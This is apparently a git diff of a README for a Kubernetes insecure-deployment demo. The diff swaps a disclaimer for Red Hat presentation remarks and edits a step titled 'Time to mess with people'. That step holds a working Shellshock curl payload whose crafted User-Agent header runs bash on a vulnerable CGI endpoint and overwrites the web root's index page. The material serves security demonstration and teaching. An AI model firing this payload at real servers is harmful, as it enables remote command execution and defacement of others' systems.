@@ -1,8 +1,11 @@
 # Insecure Deployment Demo
 
-This repo is intended to host insecure deployments for educational and demo purposes. These should never be run in privileged mode and should avoid use on public networks.
+Thanks Rob! We're excited to be joining the Red Hat team. As we focus on Red Hat advanced cluster security we want to show you security through a different lense today.
 
-This deployment is based off of public projects such as the Damn Vulerable Web Application and is intended to be used to demo the shellshock exploit in a Kubernetes environment. Its reccomended to use port forwarding to ensure this is not exposed.
+We believe that security is like on onion. It should have layers to it. 
+
+Your defensive strategy should not be broken if one control is bypassed and thats part of the beauty of the movement to containerization.
+
 
 Containerization as a movement has isolated this attack surface.
 
@@ -77,7 +80,7 @@ http://localhost:8080/cgi-bin/vulnerable
 
 6. Time to mess with people
 
-curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>I like cat memes - also you should protect your stuff</h1><body><img src=https://miro.medium.com/max/1200/1*7_m4dF9OqBjePqqRyJ1O-g.jpeg></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>I like cat memes - also you should protect your stuff</h1><body><img src=https://i.redd.it/v5cingisv6p01.jpg></body></html>\" > /var/www/index.html'" http://localhost:9080/cgi-bin/vulnerable
 
 ### Blue team
 
